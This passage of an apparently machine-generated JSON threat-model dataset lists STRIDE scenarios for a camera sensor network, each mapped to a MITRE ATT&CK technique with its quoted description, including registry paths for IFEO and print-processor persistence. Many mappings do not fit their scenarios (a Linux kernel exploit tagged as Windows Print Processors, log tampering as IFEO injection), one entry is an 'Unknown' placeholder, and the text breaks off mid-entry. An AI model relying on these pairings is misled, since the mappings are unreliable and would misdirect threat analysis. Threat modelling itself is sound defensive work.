            "Scenario": "An unauthorized user tries to manipulate system logs to show false entries.",
            "Assumptions": [
                {
                    "Assumption": "Log integrity checks are absent or ineffective.",
                    "Role": "System Design",
                    "Condition": "True if logs can be manipulated without detection."
                },
                {
                    "Assumption": "Privileges are not properly managed, allowing unauthorized log alterations.",
                    "Role": "Access Control",
                    "Condition": "True if unauthorized users have unnecessary privileges."
                },
                {
                    "Assumption": "Incident detection processes do not verify log authenticity.",
                    "Role": "System Monitoring",
                    "Condition": "True if incident response lacks log validation processes."
                }
            ],
            "Potential Impact": "Manipulated logs, inaccurate forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit trails",
                "repudiation",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker utilizes an unmonitored backdoor to alter audit logs and cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "The system has an exploitable backdoor.",
                    "Role": "System Vulnerability",
                    "Condition": "True if backdoors exist and are not monitored."
                },
                {
                    "Assumption": "There is no continuous monitoring to detect unauthorized log changes.",
                    "Role": "System Monitoring",
                    "Condition": "True if effective monitoring is absent."
                },
                {
                    "Assumption": "Attackers can access the backdoor and utilize it without detection.",
                    "Role": "Attacker Capability",
                    "Condition": "True if the backdoor is accessible and undetected."
                }
            ],
            "Potential Impact": "Concealed unauthorized actions, system wide compromises.",
            "MITRE ATT&CK Keywords": [
                "backdoor access",
                "audit log",
                "repudiation",
                "cover tracks"
            ],
            "mitre_technique": {
                "name": "Image File Execution Options Injection",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
                "id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
                "technique_id": "T1546.012"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmitted between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Design",
                    "Condition": "True if secure transmission protocols are not used."
                },
                {
                    "Assumption": "The attacker can access network traffic.",
                    "Role": "Attacker Capability",
                    "Condition": "True if network traffic is relatively easily accessible."
                },
                {
                    "Assumption": "The attacker has the tools and knowledge to decrypt or read intercepted data.",
                    "Role": "Attacker Knowledge",
                    "Condition": "True if the attacker can use data interception tools effectively."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data captured by the network.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "sensitive data",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exploiting a Linux kernel vulnerability to access sensitive visual data stored on the server.",
            "Assumptions": [
                {
                    "Assumption": "The system is running a vulnerable Linux kernel version.",
                    "Role": "System Version",
                    "Condition": "True if patches are not applied."
                },
                {
                    "Assumption": "The attacker has knowledge of the specific vulnerability and how to exploit it.",
                    "Role": "Attacker Knowledge",
                    "Condition": "True if the attacker has sufficient technical details."
                },
                {
                    "Assumption": "Sensitive data is inadequately protected on the server.",
                    "Role": "Data Security",
                    "Condition": "True if access controls on sensitive data are weak."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of stored visual data.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "information disclosure",
                "sensitive data",
                "Linux"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised node captures and transmits visual data to an attacker-controlled server.",
            "Assumptions": [
                {
                    "Assumption": "Node communication is not sufficiently authenticated and verified.",
                    "Role": "System Design",
                    "Condition": "True if communications lack robust authentication."
                },
                {
                    "Assumption": "The attacker has compromised a node and redirected its data streams.",
                    "Role": "Attacker Capability",
                    "Condition": "True if node compromise is possible."
                },
                {
                    "Assumption": "Visual data is not encrypted before transmission.",
                    "Role": "Data Protection",
                    "Condition": "True if data is transmitted in plaintext."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and potential misuse of visual data.",
            "MITRE ATT&CK Keywords": [
                "node compromise",
                "data redirection",
                "information disclosure",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with traffic, overwhelming camera nodes and central servers.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not adequately monitored or filtered.",
                    "Role": "System Monitoring",
                    "Condition": "True if traffic monitoring is inadequate."
                },
                {
                    "Assumption": "The attacker has the capability to generate high volumes of traffic.",
                    "Role": "Attacker Capability",
                    "Condition": "True if the attacker can sustain high-volume attacks."
                },
                {
                    "Assumption": "Camera nodes and central servers lack protections against DoS attacks.",
                    "Role": "System Design",
                    "Condition": "True if anti-DoS measures are not implemented."
                }
            ],
            "Potential Impact": "Disruption of visual data capture and transmission, system unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flooding",
                "disruption",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the Linux OS to crash the VSN application.",
            "Assumptions": [
                {
                    "Assumption": "The system is running a version of Linux vulnerable to DoS attacks.",
                    "Role": "System Version",
                    "Condition": "True if the Linux version is unpatched."
                },
                {
                    "Assumption": "The attacker has knowledge and tools to exploit this vulnerability.",
                    "Role": "Attacker Knowledge",
                    "Condition": "True if the attacker is technically capable."
                },
                {
                    "Assumption": "No mitigation or workaround is in place to handle this vulnerability.",
                    "Role": "System Management",
                    "Condition": "True if no preventive measures have been applied."
                }
            ],
            "Potential Impact": "Complete system outage, unavailability of visual data services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "system crash",
                "Linux"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious insider deliberately reconfigures network devices to block camera node communications.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have administrative access to network configuration.",
                    "Role": "Insider Permissions",
                    "Condition": "True if insiders have broad access rights."
                },
                {
                    "Assumption": "Network changes are not properly logged or monitored.",
                    "Role": "System Monitoring",
                    "Condition": "True if change management and logging are weak."
                },
                {
                    "Assumption": "The insider has malicious intent or can be coerced.",
                    "Role": "Insider Motivations",
                    "Condition": "True if the insider is susceptible to insider threat scenarios."
                }
            ],
            "Potential Impact": "Disruption of system operations and loss of visual data streams.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "denial of service",
                "network configuration",
                "IoT"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a Linux kernel vulnerability to gain root access on a camera node.",
            "Assumptions": [
                {
                    "Assumption": "The system is running a vulnerable version of the Linux kernel.",
                    "Role": "System Version",
                    "Condition": "True if patches are not applied."
                },
                {
                    "Assumption": "The attacker has knowledge of the specific vulnerability and how to exploit it.",
                    "Role": "Attacker Knowledge",
                    "Condition": "True if the attacker has sufficient technical details."
                },
                {
                    "Assumption": "Security controls do not adequately isolate user privileges.",
                    "Role": "Access Control",
                    "Condition": "True if access controls are weak or ineffective."
                }
            ],
            "Potential Impact": "Unauthorized control over camera nodes, system compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "Linux kernel",
                "root access",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses an unprotected API to gain administrative access to the visual sensor network.",
            "Assumptions": [
                {
                    "Assumption": "APIs used by the system do not require strong authentication.",
                    "Role": "System Design",
                    "Condition": "True if APIs are inadequately protected."
                },
                {
                    "Assumption": "The attacker can identify and access these unprotected APIs.",
                    "Role": "Attacker Capability",
                    "Condition": "True if API endpoints are discoverable."
                },
                {
                    "Assumption": "There is no adequate logging or monitoring to detect unauthorized API access.",
                    "Role": "System Monitoring",
                    "Condition": "True if API security is weak."
                }
            ],
            "Potential Impact": "Unauthorized administrative access, potential full system control.",
            "MITRE ATT&CK Keywords": [
                "API exploitation",
                "privilege escalation",
                "administrative access",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised insider escalates privileges by exploiting weak access controls in the central management server.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have initial low-privilege access to the central server.",
                    "Role": "Insider Permissions",
                    "Condition": "True if insiders start with some level of access."
                },
                {
                    "Assumption": "Access controls do not segregate duties or enforce the principle of least privilege.",
                    "Role": "Access Control",
                    "Condition": "True if access control policies are not stringent."
                },
                {
                    "Assumption": "The insider has knowledge of vulnerability or misconfiguration allowing privilege escalation.",
                    "Role": "Insider Knowledge",
                    "Condition": "True if the insider is technically knowledgeable."
                }
            ],
            "Potential Impact": "Unauthorized system modifications, full system compromise.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege escalation",
                "central server",
                "access control"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker impersonates a legitimate camera node to gain access to the VSN.",
            "Assumptions": [
                {
                    "Assumption": "No effective mutual authentication between the camera nodes and the network",
                    "Role": "Network Administrator",
                    "Condition": "Implemented network protocols do not require mutual authentication."
                },
                {
                    "Assumption": "Attacker has access to network channels",
                    "Role": "Attacker",
                    "Condition": "Attacker has successfully sniffed or infiltrated network communication channels."
                },
                {
                    "Assumption": "No robust device ID validation mechanisms",
                    "Role": "System Architect",
                    "Condition": "The system lacks strong validation processes for device identification."
                }
            ],
            "Potential Impact": "Loss of data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker fakes the identity of a legitimate user to access the visual data.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no authentication mechanisms for user access",
                    "Role": "System Administrator",
                    "Condition": "User authentication methods are not robust or are nonexistent."
                },
                {
                    "Assumption": "Visual data is valuable and sensitive",
                    "Role": "Business Owner",
                    "Condition": "Captured visual data contains sensitive information."
                },
                {
                    "Assumption": "User authentication credentials can be captured or inferred",
                    "Role": "Attacker",
                    "Condition": "Authentication credentials are not adequately protected."
                }
            ],
            "Potential Impact": "Unauthorized data access and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "user",
                "credentials",
                "data access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker mimics a central server to control camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Nodes do not verify the authenticity of server communications",
                    "Role": "System Developer",
                    "Condition": "Nodes do not perform adequate checks on communications from the server."
                },
                {
                    "Assumption": "Network is accessible to the attacker",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access to communicate with nodes."
                },
                {
                    "Assumption": "Central server lacks robust defenses against impersonation",
                    "Role": "System Administrator",
                    "Condition": "Central server security mechanisms are not sufficient."
                }
            ],
            "Potential Impact": "Disruption of system operations and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "server",
                "control",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data 